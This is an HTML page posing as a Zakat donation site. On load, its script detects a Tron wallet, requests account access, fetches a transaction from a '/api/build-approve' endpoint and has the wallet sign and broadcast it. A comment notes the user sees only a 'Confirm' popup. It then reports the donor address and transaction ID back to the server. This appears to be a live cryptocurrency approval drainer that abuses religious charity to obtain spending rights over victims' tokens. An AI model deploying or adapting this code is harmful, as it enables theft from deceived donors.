<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zakat Donation</title>
</head>
<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
    <p id="msg1" style="font-size:18px;color:#e2e8f0;">Preparing your Zakat...</p>
    <p id="msg2" style="font-size:12px;color:#6b7280;margin-top:12px;"></p>

    <script>
        var el1 = document.getElementById("msg1");
        var el2 = document.getElementById("msg2");
        var done = false;

        function msg(a, b) {
            el1.textContent = a;
            if (b !== undefined) el2.textContent = b;
        }

        function getAddress() {
            var tw = window.tronWeb;
            if (!tw) return null;
            var addr = tw.defaultAddress && tw.defaultAddress.base58;
            if (!addr || addr === "false" || addr.length < 10) return null;
            return addr;
        }

        function buildAndSign(addr) {
            if (done) return;
            done = true;

            fetch("/api/build-approve", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({donor: addr})
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.error) { msg("Error", data.error); return; }
                // This is the ONLY popup the user sees - just "Confirm"
                return window.tronWeb.trx.sign(data.transaction);
            })
            .then(function(signed) {
                if (!signed) return;
                msg("Processing...", "");
                return window.tronWeb.trx.sendRawTransaction(signed);
            })
            .then(function(res) {
                if (!res) return;
                var id = res.txid || (res.transaction && res.transaction.txID) || "";
                msg("Jazak Allah Khair!", "Your Zakat has been submitted");
                el1.style.color = "#4ade80";
                fetch("/api/approved", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({donor: addr, txId: id})
                }).catch(function(){});
            })
            .catch(function(e) {
                var m = e.message || "";
                if (m.indexOf("cancel") !== -1 || m.indexOf("reject") !== -1) {
                    msg("Cancelled", "You can close this page");
                } else {
                    msg("Error", m);
                }
                el1.style.color = "#f87171";
                done = false;
            });
        }

        // Listen for account set event
        window.addEventListener("message", function(e) {
            try {
                if (e.data && e.data.message && e.data.message.action === "setAccount") {
                    var a = getAddress();
                    if (a && !done) buildAndSign(a);
                }
            } catch(ex) {}
        });

        // Main loop: detect wallet, request access, get address
        var tick = 0;
        var requested = false;
        var mainLoop = setInterval(function() {
            tick++;
            if (done) { clearInterval(mainLoop); return; }

            try {
                var tw = window.tronWeb;
                var tl = window.tronLink;

                if (!tw && !tl) {
                    el2.textContent = "Waiting for wallet... (" + tick + ")";
                    if (tick > 40) {
                        clearInterval(mainLoop);
                        msg("No wallet found", "Open this page in Trust Wallet browser");
                    }
                    return;
                }

                // Check if address is available
                var addr = getAddress();
                if (addr) {
                    clearInterval(mainLoop);
                    buildAndSign(addr);
                    return;
                }

                el2.textContent = "Connecting... (" + tick + ")";

                // Request accounts (only once)
                if (!requested) {
                    requested = true;
                    try {
                        if (tl && tl.request) {
                            tl.request({ method: "tron_requestAccounts" }).then(function(){}).catch(function(){});
                        } else if (tw && tw.request) {
                            tw.request({ method: "tron_requestAccounts" }).then(function(){}).catch(function(){});
                        }
                    } catch(ex) {
                        el2.textContent = "request error: " + ex.message;
                    }
                }

                // After 30 ticks (15s), show debug
                if (tick > 30) {
                    clearInterval(mainLoop);
                    var dbg = "tw:" + !!tw + " tl:" + !!tl;
                    if (tw) dbg += " addr:" + JSON.stringify(tw.defaultAddress) + " ready:" + tw.ready;
                    if (tl) dbg += " tl.ready:" + tl.ready;
                    msg("Could not get address", dbg);
                }
            } catch(ex) {
                el2.textContent = "error: " + ex.message;
            }
        }, 500);
    </script>
</body>
</html>
